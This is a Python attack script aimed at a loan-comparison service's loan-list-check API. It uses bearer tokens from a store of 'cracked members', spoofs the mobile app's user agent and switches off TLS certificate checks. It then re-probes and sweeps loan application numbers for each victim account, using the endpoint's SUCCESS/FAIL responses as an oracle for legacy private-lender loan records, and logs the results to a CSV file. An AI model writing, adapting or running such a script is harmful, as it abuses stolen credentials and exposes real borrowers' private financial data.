#!/usr/bin/env python3
"""loReqtNo mapper v2 via POST /bigyo/api/bigyo/loan-list-check.

iter-12 map: 36/38 values SUCCESS for subject 01040062401; only 100 and
1000000 FAILed — and BOTH failed identically in iter-10 too, while other
iter-10 FAILs (1, datefmt, huge) flipped to SUCCESS in iter-12. Hypotheses:
  H1 sticky: 100/1000000 collide with hot legacy daebu rows (row-lock
     contention -> JTA rollback) => real (subject,value) discriminator.
  H2 transient: JTA rollbacks are ambient server noise, subject skew
     coincidental => no oracle.

v2 protocol:
  R1 re-probe every historically-F value for the subject (rollbacks are
     clean, re-probing is safe) -> STICKY (F again) vs FLIP (now S).
  R2 neighbourhood characterisation around each F value (+/-1, /10, *10).
  R3 cross-subject: probe the same F values with OTHER members' tokens.
Sticky F values that survive R1+R3 are promoted to oracle candidates.
"""
import csv
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import tokstore

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
PATH = "/bigyo/api/bigyo/loan-list-check"
PACE = 0.4
BUDGET = int(os.environ.get("LCHK_MAP_BUDGET", "25"))
MAP_CSV = os.path.join(HERE, "lchk_map.csv")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}]", msg, flush=True)


def call(token, value):
    url = BASE + PATH + "?loReqtNo=" + urllib.parse.quote(str(value))
    req = urllib.request.Request(url, data=b"{}", headers={
        "User-Agent": UA, "Content-Type": "application/json",
        "Accept": "*/*", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
            raw = r.read().decode("utf-8", "replace")
            st = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        st = e.code
    except Exception as e:
        return 0, "ERR", repr(e)[:80]
    norm = raw.replace(" ", "")
    if '"result":"SUCCESS"' in norm:
        cls = "S"
    elif '"result":"FAIL"' in norm:
        cls = "F"
    else:
        cls = f"H{st}"
    return st, cls, raw[:160]


def record(subject, value, st, cls, snip):
    new = not os.path.exists(MAP_CSV)
    with open(MAP_CSV, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if new:
            w.writerow(["ts", "subject", "value", "http", "cls", "snippet"])
        w.writerow([time.strftime("%FT%TZ", time.gmtime()), subject,
                    value, st, cls, snip])


def history(cls_filter=None):
    rows = []
    if os.path.exists(MAP_CSV):
        with open(MAP_CSV, newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                if cls_filter is None or r.get("cls") == cls_filter:
                    rows.append(r)
    return rows


def main():
    creds = tokstore.load()
    if not creds:
        log("LCHKMAP3 no cracked members")
        return
    log("LCHKMAP3 START")
    by_mob = {c["mobile"]: c for c in creds}

    # historical F values per subject
    fvals = {}
    for r in history("F"):
        fvals.setdefault(r.get("subject", ""), []).append(r["value"])
    if not fvals:
        log("LCHKMAP3 no F history")
        return

    # R1: re-probe F values for their subject
    spent = 0
    for mob, vals in fvals.items():
        cr = by_mob.get(mob)
        if not cr:
            continue
        for v in sorted(set(vals)):
            if spent >= BUDGET:
                break
            spent += 1
            st, cls, snip = call(cr["token"], v)
            record(mob, v, st, cls, snip)
            tag = "FLIP->S" if cls == "S" else f"STICKY-F"
            log(f"R1 {mob} {v} -> {cls} {tag}")
            time.sleep(PACE)

    # R2: systematic low-range sweep for EVERY subject (F-points = that
    # subject's legacy daebu-linked application numbers). Watermark per
    # subject in lchk_sweep_watermark.json; 0.4s pace, budget-bound.
    wm_fp = os.path.join(HERE, "lchk_sweep_watermark.json")
    watermarks = {}
    if os.path.exists(wm_fp):
        try:
            watermarks = json.load(open(wm_fp))
        except Exception:
            watermarks = {}
    SWEEP_LO, SWEEP_HI = 1, 2000
    per_subj = max(10, (BUDGET - spent) // max(1, len(creds)))
    for cr in creds:
        mob = cr["mobile"]
        wm = int(watermarks.get(mob, SWEEP_LO))
        if wm >= SWEEP_HI:
            continue
        hist = {r["value"] for r in history() if r.get("subject") == mob}
        n_new = 0
        for v in range(wm, min(wm + 120, SWEEP_HI)):
            if n_new >= per_subj:
                break
            sv = str(v)
            if sv in hist:
                continue
            spent += 1
            st, cls, snip = call(cr["token"], sv)
            record(mob, sv, st, cls, snip)
            hist.add(sv)
            n_new += 1
            if cls == "F":
                log(f"FPOINT {mob} {sv} <- legacy application candidate")
            time.sleep(PACE)
        if n_new:
            watermarks[mob] = wm + n_new
            with open(wm_fp, "w") as f:
                json.dump(watermarks, f)

    log(f"LCHKMAP3 DONE spent={spent}")


if __name__ == "__main__":
    main()
